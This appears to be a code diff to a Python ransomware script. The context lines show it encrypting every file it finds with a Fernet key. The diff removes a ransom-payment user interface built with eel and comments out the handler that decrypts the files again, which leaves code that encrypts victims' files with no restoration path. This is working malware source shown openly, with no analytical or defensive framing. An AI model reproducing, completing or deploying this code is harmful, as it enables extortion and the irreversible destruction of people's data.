@@ -1,4 +1,3 @@
-import eel
 import argparse
 import os
 from cryptography.fernet import Fernet
@@ -54,24 +53,14 @@ if __name__ == "__main__":
             print(f"encrypted {file}")
             encrypt_file(file, key)
 
-    # show ransom ui with address for payment
-    eel.init('ui')
+    # def handleButtonPress(key):
+    #     # load the key
+    #     print("Value from text box:", key)
+    #     l_key = key
 
-    # handle on click for eel
-    @eel.expose
-    def handleButtonPress(key):
-        # load the key
-        print("Value from text box:", key)
-        l_key = key
-
-        # decrypt all files that were encrypted
-        files = find_files(os_root_path)
-        for file in files:
-            print(f"decrypted {file}")
-            decrypt_file(file, l_key)
-
-    # start the eel ui
-    eel.start(
-        'index.html',
-        size=(800, 600),
-    )
+    #     # decrypt all files that were encrypted
+    #     files = find_files(os_root_path)
+    #     for file in files:
+    #         print(f"decrypted {file}")
+    #         decrypt_file(file, l_key)
+    
